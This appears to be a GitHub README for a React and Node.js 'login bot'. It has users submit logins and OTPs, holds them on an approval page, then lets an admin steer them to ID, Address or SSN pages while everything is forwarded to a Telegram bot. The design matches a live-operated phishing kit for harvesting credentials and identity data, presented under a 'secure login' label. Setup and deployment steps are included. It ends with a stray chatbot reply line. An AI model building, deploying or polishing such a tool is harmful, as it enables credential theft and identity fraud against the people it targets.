# Tele Login Bot 

## Short Description
Tele Login Bot is a React.js-based application that allows users to log in, then wait for approval from the admin. Once approved, the admin can choose to direct the user to the ID, Address, or SSN page. The login data is sent to a Telegram bot using the `node-telegram-bot-api` on the Node.js backend.

## 🇮🇩 Indonesian Comment

## Key Features
- Secure user login process.
- A loading page showing the approval status from the admin.
- Admin can choose to direct the user to the ID, Address, or SSN page.
- User login data is sent to the Telegram bot using the `node-telegram-bot-api`.

## Technologies Used
- **React.js**: Framework for the frontend application.
- **Node.js**: Backend server to manage the app flow and interact with the Telegram bot.
- **axios**: For sending HTTP requests to the backend.
- **input-otp**: For OTP input on the application.
- **react-router-dom**: For routing between pages on the frontend.
- **node-telegram-bot-api**: To send data to the Telegram bot.

The dependencies used in this project are as follows:
```json
{
  "name": "web_6",
  "version": "0.1.0",
  "private": true,
  "dependencies": {
    "@testing-library/jest-dom": "^5.17.0",
    "@testing-library/react": "^13.4.0",
    "@testing-library/user-event": "^13.5.0",
    "axios": "^1.7.7",
    "input-otp": "^1.2.4",
    "react": "^18.3.1",
    "react-dom": "^18.3.1",
    "react-otp-input": "^3.1.1",
    "react-router-dom": "^6.26.1",
    "react-scripts": "5.0.1",
    "web-vitals": "^2.1.4"
  },
  "scripts": {
    "start": "react-scripts start",
    "build": "react-scripts build",
    "test": "react-scripts test",
    "eject": "react-scripts eject"
  },
  "eslintConfig": {
    "extends": [
      "react-app",
      "react-app/jest"
    ]
  },
  "browserslist": {
    "production": [
      ">0.2%",
      "not dead",
      "not op_mini all"
    ],
    "development": [
      "last 1 chrome version",
      "last 1 firefox version",
      "last 1 safari version"
    ]
  }
}
```

## Installation Instructions
1. Clone this repository:
   ```bash
   git clone https://github.com/adistianherlambang/Tele-Login-Bot.git
   ```
2. Navigate to the project directory:
   ```bash
   cd repository
   ```
3. Install dependencies:
   ```bash
   npm install
   ```
4. Change the backend URL in the code:
   - Replace `http://localhost:1000/` with your own backend URL.
5. Start the application:
   ```bash
   npm run start
   ```

## How to Use
1. After the installation is complete, open the browser and go to `http://localhost:3000` to see the application.
2. The user can log in and wait for approval from the admin.
3. The admin will have the option to direct the user to the ID, Address, or SSN page.
4. The login data will be sent to the Telegram bot for each successful user login.

## Contribution
This project is not open for contributions.

## License
This project does not use an open license.

## Contact or Additional Information
- Email: [email@example.com](adistian59@gmail.com)

---

Let me know if you need further adjustments!
